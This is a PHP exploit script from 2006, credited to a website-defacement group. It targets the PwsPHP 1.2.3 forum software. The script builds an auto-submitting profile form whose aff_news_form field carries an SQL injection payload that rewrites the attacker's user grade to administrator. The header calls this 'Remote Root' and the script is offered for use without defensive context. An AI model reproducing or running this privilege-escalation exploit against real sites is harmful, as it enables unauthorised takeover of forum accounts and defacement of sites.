<?php

/*

PwsPHP 1.2.3 & <? Remote Root
magic quote: Off
Credited: papipsycho
write code: papipsycho
for: G0t R00t ? Amd [W]orld [D]efacers
Website: http://www.papipsycho.com & http://www.worlddefacers.net
Date: 09/02/2006

to connect and logged with the cookie then to launch the exploit
Enjoy.

*/

echo "<title>PwsPHP 1.2.3 & <? Remote Root :: By Papipsycho</title>"
         . "to connect and logged with the cookie then to launch the exploit<br>Enjoy.<br><br>";

if(empty($_POST['url']) AND empty($_POST['pseudo']) AND empty($_POST['pass']) AND empty($_POST['nom']))
{
        echo "<form method=\"post\" action=\"pws-root_paps.php\">"
                 . "Pseudo: <input type=\"text\" name=\"pseudo\"><br>"
                 . "Pass: <input type=\"text\" name=\"pass\"><br>"
                 . "Id: <input type=\"text\" name=\"id\"><br>"
                 . "Name: <input type=\"text\" name=\"nom\"><br>"
                 . "Mail: <input type=\"text\" name=\"mail\"><br>"
                 . "Url: <input type=\"text\" name=\"url\" value=\"http://example.com/pwsphp\"><br>"
                 . "<input type=\"submit\" value=\"Send\">"
                 . "</form>";
}
else
{
        $url = $_POST['url'];
        $pseudo = $_POST['pseudo'];
        $pass = $_POST['pass'];
        $pass_md5 = md5($pass);
        $nom = $_POST['nom'];
        $mail = $_POST['mail'];
        $id = $_POST['id'];

        echo "<form method=\"post\" name=\"new_user\" action=\"$url/profil.php\" id=\"formulaire\">"
                 . "<input type=\"hidden\" name=\"pseudo\" value=\"$pseudo\">"
                 . "<input type=\"hidden\" name=\"nom\" value=\"$nom\">"
                 . "<input type=\"hidden\" name=\"pass2\" value=\"$pass\">"
                 . "<input type=\"hidden\" name=\"oldpass\" value=\"$pass_md5\">"
                 . "<input type=\"hidden\" name=\"email\" value=\"$mail\">"
         . "<input type=\"hidden\" name=\"aff_email\" value=\"1\">"
                 . "<input type=\"hidden\" name=\"mp_popup\" value=\"1\">"
                 . "<input type=\"hidden\" name=\"popup\" value=\"1\">"
                 . '<input type="hidden" name="aff_news_form" value=\'10",grade="4" WHERE `users`.`pseudo`="' . $pseudo . '" AND `users`.`id`="' .$id . '"/*\'>'
                 . "<input type=\"hidden\" name=\"icq\" value=\"\">"
                 . "<input type=\"hidden\" name=\"aim\"  value=\"\">"
                 . "<input type=\"hidden\" name=\"msn\"  value=\"\">"
                 . "<input type=\"hidden\" name=\"yahoom\" value=\"\">"
                 . "<input type=\"hidden\" name=\"site\"  value=\"\">"
                 . "<input type=\"hidden\" name=\"localisation\"  value=\"\">"
                 . "<input type=\"hidden\" name=\"urlavatar\" value=\"images/avatars/1.gif\">"
                 . "<input type=\"hidden\" name=\"signatue\" value=\"\">"
         . "<input type=\"hidden\" name=\"ok\" value=\"1\">"
         . "<input type=\"hidden\" name=\"id\" value=\"$id\">"
         . "<input type=\"hidden\" name=\"ac\" value=\"modifier\">"
         . "<center><input type=\"submit\" value=\"Clic Here\"></center>"
                 . "</form>";
}
?>
